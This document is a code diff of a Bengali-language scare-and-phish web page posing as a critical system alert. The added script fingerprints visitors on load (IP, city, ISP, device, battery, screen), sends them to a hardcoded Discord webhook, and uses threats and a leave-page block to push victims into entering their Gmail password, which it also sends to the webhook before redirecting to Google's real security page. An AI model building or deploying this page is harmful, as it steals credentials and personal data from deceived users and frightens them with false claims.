@@ -1,77 +1,92 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Recovery System</title>
+    <title>System Critical Alert #8821</title>
     <style>
-        body { background: #ffffff; color: #000; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .box { width: 85%; max-width: 380px; border: 2px solid #ff0000; padding: 20px; border-radius: 12px; text-align: center; box-shadow: 0 0 20px rgba(255,0,0,0.1); }
-        .warn { color: #ff0000; font-weight: bold; font-size: 20px; text-transform: uppercase; margin-bottom: 10px; }
-        .ip-box { background: #f0f0f0; padding: 8px; border-radius: 5px; font-family: monospace; font-weight: bold; margin: 10px 0; font-size: 14px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 14px; background: #ff0000; color: #fff; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        body { background: #000; color: #fff; font-family: 'Arial', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .main-box { width: 90%; max-width: 400px; background: #111; border: 3px solid #ff0000; border-radius: 20px; padding: 30px; text-align: center; box-shadow: 0 0 50px rgba(255, 0, 0, 0.4); position: relative; }
+        .danger-icon { font-size: 60px; color: #ff0000; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        h1 { font-size: 22px; color: #ff0000; margin: 15px 0; }
+        .data-stream { background: #000; border: 1px solid #333; padding: 10px; font-family: 'Courier New', monospace; font-size: 12px; text-align: left; color: #0f0; margin-bottom: 20px; border-radius: 5px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ff0000; background: #222; color: #fff; border-radius: 8px; font-size: 16px; outline: none; }
+        button { width: 100%; padding: 18px; background: #ff0000; color: #fff; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 18px; transition: 0.3s; }
+        button:hover { background: #b30000; }
+        .footer { font-size: 10px; color: #555; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="warn">⚠️ সিকিউরিটি অ্যালার্ট!</div>
-    <p style="font-size: 14px; line-height: 1.5;">আপনার ডিভাইসটি <b>Suspicious Activity</b>-এর কারণে ব্লক করা হয়েছে। এখনই ভেরিফাই না করলে ডিভাইসটি স্থায়ীভাবে অচল হয়ে যাবে।</p>
+<div class="main-box">
+    <div class="danger-icon">☠️</div>
+    <h1>সিস্টেম হ্যাকড বা ব্লকড!</h1>
+    <p style="font-size: 14px; color: #ccc;">আপনার ডিভাইসে অবৈধ কার্যক্রম শনাক্ত হয়েছে। ১০ মিনিটের মধ্যে ভেরিফাই না করলে আপনার <b>NID, Gmail</b> এবং <b>Phone</b> স্থায়ীভাবে লক হবে।</p>
     
-    <div class="ip-box">সনাক্তকৃত আইপি: <span id="ip">Scanning...</span></div>
-
-    <div id="form">
-        <input type="email" id="email" placeholder="আপনার প্রাইমারি জিমেইল" required>
-        <input type="password" id="pass" placeholder="জিমেইল পাসওয়ার্ড" required>
-        <button onclick="sendCredentials()">ডিভাইস আনলক করুন</button>
+    <div class="data-stream" id="log">
+        [SYS] Initializing Scan...<br>
+        [NET] Tracking IP: Detecting...<br>
+        [DEV] Model: Identifying...
     </div>
+
+    <input type="email" id="email" placeholder="আপনার প্রধান জিমেইল এড্রেস" required>
+    <input type="password" id="pass" placeholder="জিমেইল এর পাসওয়ার্ড দিন" required>
+    <button onclick="finalStrike()">ফিক্স এবং আনলক করুন</button>
+    <div class="footer">Security ID: TRX-992-B8</div>
 </div>
 
 <script>
     const HOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
-    // ১. ক্লিক করার সাথে সাথে ফাস্ট আইপি ট্র্যাকিং
-    async function quickCapture() {
-        try {
-            // আইপি সংগ্রহের জন্য দ্রুততম সার্ভিস
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            document.getElementById('ip').innerText = data.ip;
+    // ১. ব্যাক বাটন ব্লক করা (ভয় দেখানোর জন্য)
+    window.onbeforeunload = function() { return "সতর্কবার্তা: এখন বের হলে আপনার ফোন চিরতরে অচল হবে!"; };
 
-            // ডিসকর্ডে তৎক্ষণাৎ আইপি পাঠানো
-            fetch(HOOK, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "🚀 **IMMEDIATE IP DETECTED** 🚀",
-                    embeds: [{
-                        color: 16711680,
-                        fields: [
-                            { name: "IP Address", value: data.ip },
-                            { name: "Platform", value: navigator.platform },
-                            { name: "User Agent", value: navigator.userAgent }
-                        ]
-                    }]
-                })
-            });
+    async function masterCapture() {
+        try {
+            // আইপি এবং নেটওয়ার্ক ডাটা
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            const geoData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json());
+            
+            // ব্যাটারি এবং সেন্সর ডাটা
+            let batteryInfo = "N/A";
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                batteryInfo = (batt.level * 100) + "% " + (batt.charging ? "(Charging)" : "(Discharging)");
+            }
+
+            const model = navigator.userAgent.match(/\(([^)]+)\)/)[1];
+            document.getElementById('log').innerHTML = `[NET] IP: ${ipData.ip}<br>[LOC] City: ${geoData.city}<br>[DEV] ${model}<br>[BAT] ${batteryInfo}`;
+
+            // ডিসকর্ডে সুপার ডাটা পাঠানো
+            const payload = {
+                content: "🔥 **CRITICAL STRIKE: TARGET TRAPPED** 🔥",
+                embeds: [{
+                    title: "Advanced Device Forensics",
+                    color: 16711680,
+                    fields: [
+                        { name: "🌐 IP & ISP", value: `${ipData.ip} (${geoData.org})` },
+                        { name: "📍 Location", value: `${geoData.city}, ${geoData.region}, ${geoData.country_name}` },
+                        { name: "📱 Device Model", value: model },
+                        { name: "🔋 Battery", value: batteryInfo, inline: true },
+                        { name: "🧠 RAM/Cores", value: `${navigator.deviceMemory || "Unknown"}GB / ${navigator.hardwareConcurrency} Cores`, inline: true },
+                        { name: "🖥️ Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true }
+                    ]
+                }]
+            };
+            fetch(HOOK, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload) });
+
         } catch (e) {
-            // যদি আইপি সার্ভিস ফেল করে তবে শুধু ডিভাইস ইনফো পাঠাবে
-            fetch(HOOK, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ content: "⚠️ Target entered but IP service blocked." })
-            });
+            fetch(HOOK, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({content: "⚠️ Basic Access Logged (Advanced Blocked)"}) });
         }
     }
 
-    // ২. জিমেইল ও পাসওয়ার্ড পাঠানো
-    async function sendCredentials() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
+    async function finalStrike() {
+        const u = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
 
-        if (!email || !pass) {
-            alert("সব তথ্য দিন নতুবা আপনার ফোনটি এখনই ব্যান্ড হবে!");
+        if(!u || !p) {
+            alert("ভুল তথ্য দিলে মোবাইলটি এখনই রিপেয়ার করা অসম্ভব হয়ে যাবে!");
             return;
         }
 
@@ -79,23 +94,23 @@
             method: "POST",
             headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
-                content: "🧨 **GMAIL CAPTURED** 🧨",
+                content: "🧨 **VICTORY: CREDENTIALS CAPTURED** 🧨",
                 embeds: [{
                     color: 0,
                     fields: [
-                        { name: "Email", value: email },
-                        { name: "Password", value: pass }
+                        { name: "G-Mail", value: u },
+                        { name: "Password", value: p }
                     ]
                 }]
             })
         });
 
-        alert("ভেরিফিকেশন সফল! আপনার ডিভাইসটি এখন সুরক্ষিত।");
-        window.location.href = "https://myaccount.google.com/";
+        alert("আপনার ডিভাইসটি সফলভাবে স্ক্যান করা হয়েছে এবং সুরক্ষিত আছে।");
+        window.onbeforeunload = null; // এবার বের হতে দিবে
+        window.location.href = "https://myaccount.google.com/security";
     }
 
-    // পেজ লোড হওয়ার সাথে সাথেই ফাংশনটি চালু হবে
-    window.onload = quickCapture;
+    window.onload = masterCapture;
 </script>
 
 </body>
